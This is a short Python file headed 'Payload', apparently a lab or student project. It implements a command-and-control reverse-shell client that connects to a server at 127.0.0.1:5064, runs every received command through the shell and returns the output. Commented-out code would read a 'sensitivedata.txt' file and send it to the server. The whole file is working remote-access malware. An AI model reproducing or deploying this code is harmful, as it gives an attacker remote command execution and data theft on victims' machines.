## Payload

import socket
import re
import subprocess as sp
import os
from threading import Thread

import time


FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!quit"

class c_sock:
    
    def connect(self, server_ip, server_port):
        try:
            self.ADDR = (server_ip, server_port)
            
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            
            self.client.connect(self.ADDR)
            #print("DEBUG: connected")
            return True
        except:
            pass

    ## send to server
    def send(self, msg):
        message = msg.encode(FORMAT)        
        self.client.send(message)

    '''
    def sendfile(self,file):
            #message = msg.encode(FORMAT) 
        with open('/home/kali/sensitivedata.txt',"rb") as f:
            #while True:
                #bytes_read = f.read()

                #if not bytes_read:
                    #break
                
            self.client.send(f.read())'''


    ## command and control
    def C_C(self):
        ## catching message from server
        recieved_message = self.client.recv(10000).decode(FORMAT)

        ## handling message
        if recieved_message == DISCONNECT_MESSAGE:
            output = "Disconnecting"
            exit()
        elif recieved_message == "":
            self.client.send(str("EMPTY - Try again").encode(FORMAT))
        
            '''
        elif "download" in recieved_message:
            #recieved_message = recieved_message.replace("download", "")
            print(recieved_message)
            #self.client.sendfile(recieved_message)
            with open('/home/kali/sensitivedata.txt',"rb") as f:
                self.client.sendfile(f.read().decode())'''

        
        else:
            try:
                output = sp.check_output(recieved_message, shell=True)
                #output = sp.getoutput(recieved_message)
                #print(output)
                self.client.send(output)
            except sp.CalledProcessError:
                self.client.send(str("INVALID COMMAND").encode(FORMAT))
        
        ## each new C_C function needs to be in its own thread incase it fails/errors out
    

if __name__ == "__main__":
    ## connect to server
    while True:
        if c_sock.connect(c_sock, '127.0.0.1', 5064):
            break
        else:
            print("trying to connect")
        time.sleep(30)

    # running command n control
    #t1 = Thread(target=sock.C_C, args=(sock))   
     
    while True:
        c_sock.C_C(c_sock)
        #t1.start()